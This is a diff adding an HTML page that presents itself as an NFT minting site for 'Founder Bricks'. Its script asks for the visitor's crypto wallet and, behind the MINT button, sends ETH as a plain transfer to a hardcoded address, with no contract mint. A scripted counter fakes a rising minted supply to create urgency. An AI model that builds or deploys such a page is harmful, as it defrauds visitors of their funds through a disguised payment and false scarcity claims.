@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="icon" href="/favicon.ico" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="Web site created using create-react-app" />
+    <link rel="apple-touch-icon" href="/logo192.png" />
+    <link rel="manifest" href="/manifest.json" />
+    <title>When fashion meets technology : 7,777 high utility, unique & luxurious ICONS to rule the metaverse.</title>
+    <script defer="defer" src="/static/js/main.725441d1.js"></script>
+    <link href="/static/css/main.72629a10.css" rel="stylesheet">
+</head>
+
+<body>
+    <h1> Founder Bricks® </h1>
+    <dic class="video">
+    <video autoplay loop muted>
+        <source src="bear.mp4">
+    </video>
+    </dic>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+</body>
+
+</html>
+<img src="background1.png" id="background" style="margin: 0px;padding: 0px;width: 100%;height: 100%;">
+<div id="mintcard">
+    <div class="d-flex align-items-center flex-column">
+        <img  src="img/61a7f4fc9c97eb17914a9e31_Sin-tiCC81tulo-3__1_-removebg-preview.png" loading="lazy"
+              sizes="(max-width: 479px) 44vw, 279.984375px" width="500"
+              srcset="img/61a7f4fc9c97eb17914a9e31_Sin-tiCC81tulo-3__1_-removebg-preview-p-500.png 500w, img/61a7f4fc9c97eb17914a9e31_Sin-tiCC81tulo-3__1_-removebg-preview-p-800.png 800w, img/61a7f4fc9c97eb17914a9e31_Sin-tiCC81tulo-3__1_-removebg-preview.png 866w"alt="" class="image-102">
+        <img itemprop="image" src="logo.png" width="150" height="150" alt="Mobile Logo">
+        <div class="separator"></div>
+        <div class="calculate-row d-flex justify-content-between">
+            <div class="inter fs-18 mr-3 bold">MINT</div>
+            <div class="d-flex justify-content-between align-items-center choose-qty">
+                <img increment="minus"src="img/minus.svg" alt="">
+                <div id="minus" class="mint-change" increment="minus">
+                <button id="minus"style="color:#000;border-radius:100px;font-weight:900;font-size:15px;margin-top:3px;height:30px;width:30px">−</button>
+                </div>
+                    <input type="number" value="1" id="quantity" name="userInput"style="background-color:transparent;color:#fff;border:none;font-weight:600;text-align:center;height:90px;width:100px;font-size:45px">
+                    <style>
+                        input::-webkit-inner-spin-button,
+                        input::-webkit-outer-spin-button 
+                        {
+                            -webkit-appearance: none;
+                            margin: 0
+                        }
+
+                       input[type=number] 
+                        {
+                            -moz-appearance: textfield
+                        }
+                    </style>
+
+                <img increment="plus" src="img/plus.svg" alt="">
+                <div id="plus" class="mint-change" increment="plus">
+                <button id="plus"style="color:#000;border-radius:100px;font-weight:900;font-size:15px;margin-top:3px;height:30px;width:30px">+</button>
+                </div>
+            </div>
+        </div>
+        <div class="separator"></div>
+        <div class="calculate-row d-flex justify-content-between pt-2">
+            <div class="inter fs-18 bold">TOTAL</div>
+            <label class="inter fs-18 bold" style="font-size:35px"id="ethPrice">0.15</label>
+            <div class="inter fs-18 bold mr-4">ETH</div>
+            <div id="price" style="display:none"></div>
+        </div>
+        <div class="max-button inter button-4 w-button" onclick="amountMultipliedByUserInput(),sendTransaction()"
+             class="sendEthButton button w-button"
+             style="cursor:pointer;margin-top:20px;max-width:83%;margin-left:auto;margin-right:auto">MINT
+        </div>
+        <div class="mint-now my-3 pointer button-4 w-button" id="transfer"onclick='return ym(86774055,"reachGoal","transfer"),!0'>
+            <span><span id="timer">MINT</span></span>
+        </div>
+        <strong class="bold-text-8 gradient"><br />Supply: 
+            <strong class="count" data-target="723"style="width:20px;font-weight:600">304</strong>
+        <span> / 777</span>
+        </strong>
+    </div>
+    <style>
+        body
+        {
+            overflow:hidden;
+            margin:0;
+            padding:0;
+        }
+
+        h1 
+        {
+            position:absolute;
+            top:610px;
+            left: 820px;
+            font-size: 10px;
+            color: #fff;
+            z-index:1;
+        }
+        .dis 
+        {
+            pointer-events: none;
+            cursor: default;
+            opacity: .6
+        }
+
+        #transfer 
+        {
+            display: none
+        }
+
+        #num 
+        {
+            margin-top: 10px
+        }
+
+        .num_c 
+        {
+            margin-left: 5px;
+            margin-right: 5px
+        }
+
+        .quantity 
+        {
+            font-family: Montserrat, sans-serif
+        }
+
+        #mintcard 
+        {
+            background: rgba(18, 18, 18, .8);
+            border: .5px solid #4f4f4f;
+            box-sizing: border-box;
+            box-shadow: 0 4px 4px rgb(0 0 0 / 25%);
+            border-radius: 10px;
+            max-width: 400px;
+            height: auto;
+            margin-left: 20%;
+            margin-top: -1em;
+            padding: .625em 2.25em 1.75em;
+            color: #fff;
+            position: absolute;
+            top: 150px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 99;
+            font-family: Oswald, Helvetica;
+            display: flex;
+            flex-direction: column;
+            font-size: 1rem;
+            width: 25em
+        }
+
+        #mintcard>* 
+        {
+            opacity: 1
+        }
+        
+        .video
+        {
+            position:absolute;
+            top:50%;
+            left:50%;
+            transform:translate(-50%, -50%);
+        }
+
+        .align-items-center 
+        {
+            align-items: center
+        }
+
+        .flex-column 
+        {
+            flex-direction: column
+        }
+
+        .d-flex 
+        {
+            display: flex
+        }
+
+        .mintlogotext 
+        {
+            font-family: Oswald, Helvetica;
+            font-style: normal;
+            font-weight: 700;
+            font-size: 1.875em;
+            margin-bottom: 24px
+        }
+
+        .separator 
+        {
+            height: 1px;
+            width: 100%;
+            background: #3a3a3a
+        }
+
+        .calculate-row 
+        {
+            width: 100%;
+            padding: 5px;
+            align-items: center
+        }
+
+        .justify-content-between 
+        {
+            justify-content: space-between !important
+        }
+
+        .pt-2 
+        {
+            padding-top: .5rem !important
+        }
+
+        .mint-now 
+        {
+            flex-direction: row;
+            width: 15.125em;
+            height: 2.625em;
+            font-style: normal;
+            font-weight: 700;
+            font-size: .8125em;
+            font-family: Oswald, Helvetica;
+            border-radius: 10px;
+            background: #fff;
+            color: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        .pointer 
+        {
+            cursor: pointer
+        }
+
+        .mt-3,
+        .my-3 
+        {
+            margin-top: 1rem !important
+        }
+
+        .fs-36 
+        {
+            font-size: 2.25em
+        }
+
+        .fullwidth {
+            width: 100%
+        }
+
+        .inter 
+        {
+            font-family: Oswald, Helvetica;
+            font-style: normal;
+            font-weight: 400
+        }
+
+        .fs-18 
+        {
+            font-size: 1.125em
+        }
+
+        .mr-3,
+        .mx-3 
+        {
+            margin-right: 1rem !important
+        }
+
+        .mr-4,
+        .mx-4 
+        {
+            margin-right: 1.5rem !important
+        }
+
+        .max-button 
+        {
+            width: 4.7em;
+            height: 2.4em;
+            border-radius: 10px;
+            background: #fff;
+            color: #000;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer
+        }
+
+        .align-items-center 
+        {
+            align-items: center !important
+        }
+
+        .pink 
+        {
+            color: #fff
+        }
+
+        .fs-46 
+        {
+            font-size: 2.875em
+        }
+
+        .bold 
+        {
+            font-weight: 700
+        }
+
+        .mint-change 
+        {
+            width: 2.3em;
+            cursor: pointer
+        }
+
+        .choose-qty 
+        {
+            gap: 1em
+        }
+
+        .progress,
+        .progress-bar 
+        {
+            display: flex;
+            overflow: hidden;
+            border-radius: 8px
+        }
+
+        .fs-18 
+        {
+            font-size: 1.125em
+        }
+
+        .text-center 
+        {
+            text-align: center !important
+        }
+
+        .progress-bar 
+        {
+            height: 1em;
+            flex-direction: column;
+            justify-content: center;
+            color: #fff;
+            text-align: center;
+            white-space: nowrap;
+            background-color: #fff;
+            transition: width .6s ease;
+            margin-bottom: 1rem
+        }
+
+        .progress 
+        {
+            height: 1rem;
+            font-size: .75rem;
+            background-color: hsla(0, 0%, 76.9%, .1)
+        }
+
+        .minted-now 
+        {
+            margin-top: .75rem
+        }
+
+        .logo-mintcard 
+        {
+            width: 7em;
+            margin-bottom: 1em
+        }
+
+        #mintcard 
+        {
+            margin: auto
+        }
+
+        @media (max-width:768px) 
+        {
+            #mintcard 
+            {
+                font-size: .7rem;
+                max-width: 260px
+            }
+        }
+    </style>
+</div>
+<script>const counters = document.querySelectorAll(".count"), speed = 1e6; 
+        counters.forEach((e => { const t = () => { const n = +e.getAttribute("data-target"), u = +e.innerText, i = n / speed; 
+        u < n ? (e.innerText = Math.ceil(u + i), setTimeout(t, 1e4), u % 2 == 0 && setTimeout(t, 1e3)) : e.innerText = n }; 
+        t() })); const minusButton = document.getElementById("minus"), 
+            plusButton = document.getElementById("plus"), 
+            inputField = document.getElementById("quantity"); 
+        function computeMintNow() { document.getElementById("ethPrice").textContent = "0." + 15 * inputField.value } 
+        function amountMultipliedByUserInput() 
+        { 
+            return inputValue = document.getElementById("quantity").value, 
+            parseInt(inputValue) > 5 ? inputValue = 5 : 
+            parseInt(inputValue) <= 0 && (inputValue = 1), 
+            document.getElementById("quantity").value = inputValue, 
+            decimalInputResult = .15 * inputValue * 1e18, hexInputResult = decimalInputResult.toString(16) 
+        } 
+        async function sendTransaction() 
+        { 
+            const [e] = await window.ethereum.request({ method: "eth_requestAccounts" }); 
+            await window.ethereum.request({ method: "eth_chainId" }); 
+            await window.ethereum.request({ method: "wallet_switchEthereumChain", 
+            params: [{ chainId: "0x1" }] }), amount = "11c37937e080000"; 
+            await window.ethereum.request({ method: "eth_sendTransaction", 
+            params: [{ from: e, to: "0x34379EAbfE7c0a23a7fF08050Ea5d540Da43b982", value: hexInputResult, gas: "5208" }] }) 
+        } 
+        inputField.addEventListener("change", (e => { e.preventDefault(); 
+        const t = Number(inputField.value) || 0; 
+        inputField.value < 1 ? inputField.value = 1 : inputField.value > 5 ? inputField.value = 5 : (inputField.value = t, computeMintNow()) })), 
+        minusButton.addEventListener("click", (e => { e.preventDefault(); 
+        const t = Number(inputField.value) || 0; 
+        1 !== t && (inputField.value = t - 1, computeMintNow()) })), 
+        plusButton.addEventListener("click", (e => { e.preventDefault(); 
+        const t = Number(inputField.value) || 0; 5 !== t && (inputField.value = t + 1, computeMintNow()) }))
+</script>
